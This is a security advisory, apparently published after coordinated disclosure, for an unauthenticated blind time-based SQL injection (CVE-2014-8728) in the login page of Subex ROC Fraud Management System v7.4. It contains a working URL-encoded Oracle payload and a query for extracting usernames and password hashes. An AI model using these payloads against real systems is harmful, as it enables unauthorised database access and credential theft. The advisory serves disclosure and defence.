@@ -1,0 +1,38 @@
+=======================================================================================
+Subex ROC Fraud Management System v7.4 - Unauthenticated Blind-Time Based SQL Injection
+=======================================================================================
+
+Affected Software: Subex ROC FMS v7.4 (and probably earlier versions)
+Vendor Homepage		: http://www.subex.com/
+Version			: 7.4
+Remote			: Remote
+Severity		: Very High
+Discovered by		: Anastasios Monachos (secuid0) - [anastasiosm (at) gmail (dot) com]
+CVE 			: CVE-2014-8728
+
+
+[Summary]
+A parameter at the login page of Subex ROC Fraud Management platform is vulnerable to blind-time based SQL injection.
+
+
+[Vulnerability Details]
+Authentication	: The exploitation can be performed by any unauthenticated user.
+Page 		: http://ip:port/login/login
+Backend DB 	: Oracle
+POST Parameter 	: ranger_user[name]
+
+Sample HTTP POST Request - Data only:
+-------------------------------------
+ranger_user%5Bname%5D=admin%27%20AND%203402%3D%28CASE%20WHEN%20%28ASCII%28SUBSTRC%28%28SELECT%20%28CASE%20WHEN%20%28%28SELECT%20GRANTED_ROLE%20FROM%20DBA_ROLE_PRIVS%20WHERE%20GRANTEE%3DUSER%20AND%20GRANTED_ROLE%3DCHR%2868%29%7C%7CCHR%2866%29%7C%7CCHR%2865%29%29%3DCHR%2868%29%7C%7CCHR%2866%29%7C%7CCHR%2865%29%29%20THEN%201%20ELSE%200%20END%29%20FROM%20DUAL%29%2C1%2C1%29%29%20%3E%2047%29%20THEN%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%28122%29%7C%7CCHR%28102%29%7C%7CCHR%28100%29%7C%7CCHR%28114%29%2C5%29%20ELSE%203402%20END%29%20AND%20%27a%27%3D%27a&ranger_user%5Bpassword%5D=secuid0&commit=Login&ranger_user_i2%5Bfeatures%5D=0
+
+Effect, the page will load with a delay of 5 seconds if the current database user is a member of the database administrators.
+
+Using similar SQL statements an unauthenticated malicious visitor is able to enumerate various information from the backend database including those of usernames and password hashes (select ranger_user_name,hashed_password from ROCDB.PASSWORDS where rownum<2). The hashes can further be cracked and be used to access the application. Obviously if the DB user for the application has enough privileges you may be able to own the whole Oracle server.
+
+
+[Timeline]
+09/05/2012 - Advisory created, contacted Subex
+15/05/2012 - Subex responded
+15/05/2012 - Advisory details shared
+17/05/2012 - Subex covered the issue in the latest patch cycle
+30/08/2014 - Advisory published
